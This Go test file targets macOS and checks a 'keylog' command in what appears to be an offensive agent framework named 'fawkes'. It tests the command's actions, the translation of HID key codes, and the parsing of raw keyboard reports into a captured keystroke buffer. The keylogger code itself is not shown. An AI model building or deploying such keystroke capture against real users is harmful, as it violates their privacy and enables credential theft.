//go:build darwin

package commands

import (
	"encoding/json"
	"testing"

	"fawkes/pkg/structs"
)

func TestKeylog_Name(t *testing.T) {
	cmd := &KeylogCommand{}
	if got := cmd.Name(); got != "keylog" {
		t.Errorf("Name() = %q, want %q", got, "keylog")
	}
}

func TestKeylog_Description(t *testing.T) {
	cmd := &KeylogCommand{}
	if cmd.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

func TestKeylog_UnknownAction(t *testing.T) {
	cmd := &KeylogCommand{}
	params, _ := json.Marshal(keylogArgs{Action: "invalid"})
	result := cmd.Execute(structs.Task{Params: string(params)})
	if result.Status != "error" {
		t.Errorf("Unknown action should error, got status=%q", result.Status)
	}
}

func TestKeylog_StatusWhenNotRunning(t *testing.T) {
	cmd := &KeylogCommand{}
	params, _ := json.Marshal(keylogArgs{Action: "status"})
	result := cmd.Execute(structs.Task{Params: string(params)})
	if result.Status != "success" {
		t.Errorf("Status should succeed, got status=%q", result.Status)
	}
}

func TestKeylog_StopWhenNotRunning(t *testing.T) {
	cmd := &KeylogCommand{}
	params, _ := json.Marshal(keylogArgs{Action: "stop"})
	result := cmd.Execute(structs.Task{Params: string(params)})
	if result.Status != "error" {
		t.Errorf("Stop when not running should error, got status=%q", result.Status)
	}
}

func TestKeylog_DumpWhenNotRunning(t *testing.T) {
	cmd := &KeylogCommand{}
	params, _ := json.Marshal(keylogArgs{Action: "dump"})
	result := cmd.Execute(structs.Task{Params: string(params)})
	if result.Status != "error" {
		t.Errorf("Dump when not running should error, got status=%q", result.Status)
	}
}

func TestKeylog_ClearWhenNotRunning(t *testing.T) {
	cmd := &KeylogCommand{}
	params, _ := json.Marshal(keylogArgs{Action: "clear"})
	result := cmd.Execute(structs.Task{Params: string(params)})
	if result.Status != "error" {
		t.Errorf("Clear when not running should error, got status=%q", result.Status)
	}
}

func TestHIDUsageToString_Letters(t *testing.T) {
	tests := []struct {
		usage byte
		shift bool
		want  string
	}{
		{0x04, false, "a"},
		{0x04, true, "A"},
		{0x1D, false, "z"},
		{0x1D, true, "Z"},
	}
	for _, tt := range tests {
		got := hidUsageToString(tt.usage, tt.shift)
		if got != tt.want {
			t.Errorf("hidUsageToString(0x%02X, shift=%v) = %q, want %q", tt.usage, tt.shift, got, tt.want)
		}
	}
}

func TestHIDUsageToString_Numbers(t *testing.T) {
	tests := []struct {
		usage byte
		shift bool
		want  string
	}{
		{0x1E, false, "1"},
		{0x1E, true, "!"},
		{0x27, false, "0"},
		{0x27, true, ")"},
	}
	for _, tt := range tests {
		got := hidUsageToString(tt.usage, tt.shift)
		if got != tt.want {
			t.Errorf("hidUsageToString(0x%02X, shift=%v) = %q, want %q", tt.usage, tt.shift, got, tt.want)
		}
	}
}

func TestHIDUsageToString_SpecialKeys(t *testing.T) {
	tests := []struct {
		usage byte
		want  string
	}{
		{0x28, "[ENTER]\n"},
		{0x29, "[ESC]"},
		{0x2A, "[BS]"},
		{0x2B, "[TAB]"},
		{0x2C, " "},
		{0x39, "[CAPS]"},
		{0x3A, "[F1]"},
		{0x45, "[F12]"},
		{0x4C, "[DEL]"},
		{0x4F, "[RIGHT]"},
		{0x50, "[LEFT]"},
		{0x51, "[DOWN]"},
		{0x52, "[UP]"},
	}
	for _, tt := range tests {
		got := hidUsageToString(tt.usage, false)
		if got != tt.want {
			t.Errorf("hidUsageToString(0x%02X) = %q, want %q", tt.usage, got, tt.want)
		}
	}
}

func TestHIDUsageToString_Punctuation(t *testing.T) {
	tests := []struct {
		usage byte
		shift bool
		want  string
	}{
		{0x2D, false, "-"},
		{0x2D, true, "_"},
		{0x2E, false, "="},
		{0x2E, true, "+"},
		{0x2F, false, "["},
		{0x2F, true, "{"},
		{0x30, false, "]"},
		{0x30, true, "}"},
		{0x38, false, "/"},
		{0x38, true, "?"},
	}
	for _, tt := range tests {
		got := hidUsageToString(tt.usage, tt.shift)
		if got != tt.want {
			t.Errorf("hidUsageToString(0x%02X, shift=%v) = %q, want %q", tt.usage, tt.shift, got, tt.want)
		}
	}
}

func TestProcessHIDReport_TooShort(t *testing.T) {
	kl.mu.Lock()
	kl.buffer.Reset()
	kl.keyCount = 0
	kl.mu.Unlock()

	processHIDReport([]byte{0x00, 0x00, 0x00})

	kl.mu.Lock()
	defer kl.mu.Unlock()
	if kl.keyCount != 0 {
		t.Errorf("short report should produce no keystrokes, got %d", kl.keyCount)
	}
}

func TestProcessHIDReport_SingleKey(t *testing.T) {
	kl.mu.Lock()
	kl.buffer.Reset()
	kl.keyCount = 0
	kl.shiftDown = false
	kl.ctrlDown = false
	kl.cmdDown = false
	kl.mu.Unlock()

	report := make([]byte, 8)
	report[0] = 0x00 // no modifiers
	report[2] = 0x04 // 'a'
	processHIDReport(report)

	kl.mu.Lock()
	defer kl.mu.Unlock()
	if kl.keyCount != 1 {
		t.Errorf("expected 1 keystroke, got %d", kl.keyCount)
	}
	if got := kl.buffer.String(); got != "a" {
		t.Errorf("buffer = %q, want %q", got, "a")
	}
}

func TestProcessHIDReport_ShiftModifier(t *testing.T) {
	kl.mu.Lock()
	kl.buffer.Reset()
	kl.keyCount = 0
	kl.shiftDown = false
	kl.ctrlDown = false
	kl.cmdDown = false
	kl.mu.Unlock()

	report := make([]byte, 8)
	report[0] = 0x02 // left shift
	report[2] = 0x04 // 'a' -> 'A'
	processHIDReport(report)

	kl.mu.Lock()
	defer kl.mu.Unlock()
	if got := kl.buffer.String(); got != "A" {
		t.Errorf("buffer = %q, want %q", got, "A")
	}
}
